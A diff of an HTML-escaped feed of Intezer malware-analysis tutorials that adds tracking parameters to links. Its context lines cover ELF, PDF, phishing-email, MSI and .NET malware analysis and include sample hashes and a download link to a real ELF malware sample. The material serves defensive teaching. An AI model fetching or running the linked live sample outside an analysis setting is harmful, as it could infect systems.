+&lt;p&gt;&lt;a href="https://analyze.intezer.com/files/06ad6831768fb9d04b5cbecce9753bab3be487992936eb82a00d8f77fb4b11bf?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Code reuse&lt;/a&gt;
 is also helpful for detecting Pyinstaller compiled files:&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/elf-malware/part2/images/fig22.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;We can extract the python script from the ELF binary by using
@@ -3253,7 +3253,7 @@ gather it.&lt;/p&gt;</description></item><item><title>Automating Phishing Invest
 facing a large volume of potentially malicious URLs then other approaches that
 leverage automation (like machine learning) become critical.&lt;/p&gt;
 &lt;p&gt;At Intezer, we recently launched a
-&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/"target="_blank" rel="noopener"&gt;URL scanning feature that will allow detecting phishing/malicious URLs&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;URL scanning feature that will allow detecting phishing/malicious URLs&lt;/a&gt;.
 To do so, we have multiple integrations with services such as URLscan and
 APIVoid, and additionally, we are adding in-house built tools. We built our URL
 scanner to be capable of both automated use cases (adding a deeper layer of
@@ -3710,15 +3710,15 @@ send to lure victims and they use the different capabilities of the PDF format
 for their attacks.&lt;/p&gt;
 &lt;p&gt;Many phishing attacks will contain &lt;strong&gt;links&lt;/strong&gt;, which may appear as clickable
 images of buttons, coupons,
-&lt;a href="https://analyze.intezer.com/files/dd294bd399212b760e68434af9c96a70f0ef9f7bc43b06d67addd3472eb6d69a/behavior"target="_blank" rel="noopener"&gt;fake CAPTCHA&lt;/a&gt;,
+&lt;a href="https://analyze.intezer.com/files/dd294bd399212b760e68434af9c96a70f0ef9f7bc43b06d67addd3472eb6d69a/behavior?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;fake CAPTCHA&lt;/a&gt;,
 fake play buttons, or
-&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;QR codes&lt;/a&gt;.
 The purpose of these embedded files is to redirect the victims to sites
 controlled by the threat actors where they can proceed to the next stage of the
 attack.&lt;/p&gt;
 &lt;p&gt;PDF files natively support &lt;strong&gt;JavaScript&lt;/strong&gt;, so attackers can create files that
 will
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;execute scripts once a file has been opened&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=pdf&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;execute scripts once a file has been opened&lt;/a&gt;
 at this stage to download additional payload or steal information.&lt;/p&gt;
 &lt;p&gt;Another way in which threat actors can use the format is to deliver malware in
 the &lt;strong&gt;PDF streams&lt;/strong&gt;. Streams can contain any type of data (including scripts
@@ -4368,7 +4368,7 @@ analysis. Our mission is 1. Understand how the file behaves and 2. See how
 dynamic analysis tools come in handy.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-3-Advanced-Analysis/Real-life-example/337674d6349c21d3c66a4245c82cb454fea1c4e9c9d6e3578634804793e3a6d6.sample"target="_blank" rel="noopener"&gt;Our test sample? This ELF malware found in the wild.&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;A quick side note. Uploading this file to
-&lt;a href="https://analyze.intezer.com/files/337674d6349c21d3c66a4245c82cb454fea1c4e9c9d6e3578634804793e3a6d6"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/337674d6349c21d3c66a4245c82cb454fea1c4e9c9d6e3578634804793e3a6d6?utm_campaign=research-docs&amp;amp;utm_content=part3&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;
 classifies it as Reekoobe, based on code reused from previous Rekoobe samples.
 We will analyze the file manually for practice anyway.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/elf-malware/part3/images/fig18.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
@@ -4502,7 +4502,7 @@ extracting memory dumps.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;a href="https://tria.ge/dashboard"target="_blank" rel="noopener"&gt;Hatching-Triage&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.hybrid-analysis.com/"target="_blank" rel="noopener"&gt;Hybrid-Analysis&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://intezer.com/intezer-analyze/"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://intezer.com/intezer-analyze/?utm_campaign=research-docs&amp;amp;utm_content=part3&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/intezer/linux-explorer"target="_blank" rel="noopener"&gt;Linux Expl0rer&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://itsfoss.com/install-linux-in-virtualbox/"target="_blank" rel="noopener"&gt;Linux VM&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/danieluhricek/LiSa"target="_blank" rel="noopener"&gt;LiSa&lt;/a&gt;&lt;/li&gt;
@@ -4986,7 +4986,7 @@ and the outside world, security teams have to deal with large amounts of files,
 filtering and inspecting them to prevent phishing emails from reaching the end
 user&amp;rsquo;s mailbox. In addition, threat actors implement different techniques to
 evade detection. In 2023, a wave of phishing emails started using
-&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/"target="_blank" rel="noopener"&gt;QR codes to hide malicious links&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/automated-qr-code-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;QR codes to hide malicious links&lt;/a&gt;
 and evade email security tools.&lt;/p&gt;
 &lt;p&gt;In this blog, we will cover techniques used by threat actors to make phishing
 emails &lt;em&gt;look&lt;/em&gt; legitimate and deliver malware to the victim&amp;rsquo;s endpoint. We will
@@ -5153,7 +5153,7 @@ CLI tool to extract attachments from &lt;code&gt;.eml&lt;/code&gt; messages.&lt;
 &lt;li&gt;&lt;a href="https://www.marks-lab.com/"target="_blank" rel="noopener"&gt;UUDWIN&lt;/a&gt; - Software that extracts attachments
 from &lt;code&gt;.eml&lt;/code&gt; and &lt;code&gt;.msg&lt;/code&gt; emails.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;em&gt;You can also &lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;try Intezer for free&lt;/a&gt;, which
+&lt;p&gt;&lt;em&gt;You can also &lt;a href="https://intezer.com/pricing/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;try Intezer for free&lt;/a&gt;, which
 automatically extracts URLs and files attached to phishing emails, analyzes
 collected evidence, and uses generative AI to give you insights about email
 body content and hidden HTML elements.&lt;/em&gt;&lt;/p&gt;
@@ -5168,14 +5168,14 @@ should be carefully inspected.&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;Microsoft Office files&lt;/strong&gt; - Utilize the macros or embedded OLE objects to
 deliver threats such as
-&lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/families/db6abbcc-d292-4991-bc90-207c077f5e53?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Emotet&lt;/a&gt;
 or
-&lt;a href="https://analyze.intezer.com/families/b70bfda8-0db1-4559-bc12-2525e7ac9e3b"target="_blank" rel="noopener"&gt;TrickBot&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/families/b70bfda8-0db1-4559-bc12-2525e7ac9e3b?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;TrickBot&lt;/a&gt;.
 To properly analyze these files you need to understand the format and the
 techniques threat actors implement to hide malware – check out our previous
 blog about &lt;a href="../office/"&gt;how to analyze malicious Office files&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;PDFs&lt;/strong&gt; - By nature these files can have links,
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;JavaScript code&lt;/a&gt;,
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;JavaScript code&lt;/a&gt;,
 and any file type can be embedded into a PDF file. All of these features are
 used by threat actors to hide and deliver threats. On top of that, there are
 hundreds of PDF readers and many known vulnerabilities that can be exploited
@@ -5210,7 +5210,7 @@ while fairly easily installing malware.&lt;/li&gt;
 &lt;p&gt;Inspecting attachments can be time consuming and hard and in some cases you may
 come to the conclusion that the file is trusted. To reduce the time you spend
 on analysis of files, you can connect
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt; to have it automatically
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt; to have it automatically
 collect files and use its proprietary code reuse database to extracts valuable
 information: whether the files are malicious, their behavior, IOCs, or strings
 with other samples in the database. This way you will not have to waste time on
@@ -5230,7 +5230,7 @@ results are not conclusive or you wish to dig deeper, it is worth to further
 investigate the domain and see if it was linked to any known campaigns or
 threat actors.&lt;/p&gt;
 &lt;p&gt;One of the tools you can use for inspecting URLs is
-&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/"target="_blank" rel="noopener"&gt;Intezer&amp;rsquo;s URL scanner&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&amp;rsquo;s URL scanner&lt;/a&gt;.
 &lt;strong&gt;Intezer can connect to abuse inboxes or email security systems to
 automatically collect and classify file attachments or URLs, allowing you to
 accelerate response.&lt;/strong&gt; When you submit the extracted URL, then the scanner will
@@ -5295,16 +5295,16 @@ sites or different types of attachments, all of which require different sorts
 of skills and methods to thoroughly inspect all of the artifacts.&lt;/p&gt;
 &lt;p&gt;There is a solution for handling a lot of phishing emails, even with QR codes
 hiding links or tricky attachments containing malicious scripts –
-&lt;a href="https://intezer.com/blog/alert-triage/automated-phishing-investigation/"target="_blank" rel="noopener"&gt;automate your email pipeline&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/automated-phishing-investigation/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;automate your email pipeline&lt;/a&gt;.
 Building custom workflows can help, but
-&lt;a href="https://intezer.com/blog/alert-triage/intezer-and-soar/"target="_blank" rel="noopener"&gt;SOAR playbooks have some drawbacks&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/intezer-and-soar/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;SOAR playbooks have some drawbacks&lt;/a&gt;.
 But to make phishing investigations easier and less demanding for you security
 team, it is worth setting up a smart solution with native automation for
 suspicious emails.&lt;/p&gt;
 &lt;p&gt;Automatically submitting suspicious emails and extracting evidence with using a
 platform such as Intezer means that instead of spending time investigating
 files that are trusted or known threats, you can focus on the
-&lt;a href="https://intezer.com/blog/incident-response/automated-threat-escalations-focus-on-what-matters/"target="_blank" rel="noopener"&gt;serious threats&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/incident-response/automated-threat-escalations-focus-on-what-matters/?utm_campaign=research-docs&amp;amp;utm_content=phishing&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;serious threats&lt;/a&gt;
 identified in your suspicious emails. By piping emails and attachments into
 Intezer for analysis for you get comprehensive reports about each email, laong
 file, link, and other artifacts. Your team doesn&amp;rsquo;t have to waste time on false
@@ -5847,7 +5847,7 @@ a legitimate installation.&lt;/p&gt;
 &lt;a href="https://wiki.gnome.org/msitools"target="_blank" rel="noopener"&gt;Linux&lt;/a&gt; and
 &lt;a href="https://formulae.brew.sh/formula/msitools"target="_blank" rel="noopener"&gt;Mac&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;The sha256 of the MSI file:
-&lt;a href="https://analyze.intezer.com/files/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750"target="_blank" rel="noopener"&gt;&lt;code&gt;90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://analyze.intezer.com/files/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;&lt;code&gt;90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;First, let&amp;rsquo;s examine the metadata of the file:&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo suminfo 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample
@@ -6013,7 +6013,7 @@ identify this sort of manipulation.&lt;/p&gt;
 &lt;h3&gt;MSI Installer Analysis Using Intezer&lt;span class="hx:absolute hx:-mt-20" id="msi-installer-analysis-using-intezer"&gt;&lt;/span&gt;
 &lt;a href="#msi-installer-analysis-using-intezer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So far, we have demonstrated how to investigate MSI files manually. However,
 there is a more efficient method to extract malicious payloads from these and
-other file types. Using &lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;, we
+other file types. Using &lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;, we
 leverage static and dynamic execution combined with robust code and string
 reuse analysis. This powerful approach enables analysts, SOC teams, and
 researchers to quickly identify and classify malicious files from a high volume
@@ -6090,7 +6090,7 @@ addresses from compromised accounts.&lt;/p&gt;
 &lt;p&gt;Our team identified another variant of the MSI installer that installs Atera
 Agent in the wild.&lt;/p&gt;
 &lt;p&gt;Sha256:
-&lt;a href="https://analyze.intezer.com/files/66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4"target="_blank" rel="noopener"&gt;&lt;code&gt;66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://analyze.intezer.com/files/66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4?utm_campaign=research-docs&amp;amp;utm_content=msi&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;&lt;code&gt;66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;We wanted to compare it to the installers from the report. We chose the file
 with the sha256: &lt;code&gt;ffbe988fd797cbb9a1eedb705cf00ebc8277cdbd9a21b6efb40a8bc22c7a43f0&lt;/code&gt;&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
@@ -6283,7 +6283,7 @@ system&amp;rsquo;s RAM.&lt;/p&gt;
 &lt;p&gt;Investigators use memory forensics to collect valuable information and evidence
 from compromised systems. As threat actors try to evade detection using various
 techniques,
-&lt;a href="https://intezer.com/blog/incident-response/what-is-fileless-malware-explained-with-examples/"target="_blank" rel="noopener"&gt;fileless malware&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/incident-response/what-is-fileless-malware-explained-with-examples/?utm_campaign=research-docs&amp;amp;utm_content=tools&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;fileless malware&lt;/a&gt;
 is particularly challenging. This technique allows malicious code to be
 executed directly in memory without being written to the disk. Memory forensics
 proves very handy in these situations.&lt;/p&gt;
@@ -6408,7 +6408,7 @@ advancements in tools, techniques, and training help to mitigate these
 difficulties. Automation and machine learning are leveraged to sift through
 large datasets more efficiently. Community-driven efforts are improving the
 sharing of knowledge and best practices. Furthermore, the development of
-&lt;a href="https://intezer.com/blog/incident-response/simplifying-endpoint-forensics-and-memory-analysis/"target="_blank" rel="noopener"&gt;more intuitive and powerful forensic tools&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/incident-response/simplifying-endpoint-forensics-and-memory-analysis/?utm_campaign=research-docs&amp;amp;utm_content=tools&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;more intuitive and powerful forensic tools&lt;/a&gt;
 is gradually lowering the barrier to entry, making memory forensics more
 accessible to a broader range of professionals. (More on this below!)&lt;/p&gt;
 &lt;h2&gt;Examples of Memory Threats&lt;span class="hx:absolute hx:-mt-20" id="examples-of-memory-threats"&gt;&lt;/span&gt;
@@ -6915,7 +6915,7 @@ versions of other assemblies it depends on.&lt;/li&gt;
 &lt;h2&gt;Diving Into the .NET Executables Format&lt;span class="hx:absolute hx:-mt-20" id="diving-into-the-net-executables-format"&gt;&lt;/span&gt;
 &lt;a href="#diving-into-the-net-executables-format" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In this section, we will dive into the .NET internals. To demonstrate the
 concepts we cover, we will use an
-&lt;a href="https://analyze.intezer.com/files/32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77"target="_blank" rel="noopener"&gt;example&lt;/a&gt; -
+&lt;a href="https://analyze.intezer.com/files/32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77?utm_campaign=research-docs&amp;amp;utm_content=exe-structure&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;example&lt;/a&gt; -
 the notorious Sunburst (SolarWinds) so you can follow along. Hash:
 &lt;code&gt;32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;We will use &lt;a href="https://github.com/dnSpy/dnSpy"target="_blank" rel="noopener"&gt;dnSpy&lt;/a&gt;,
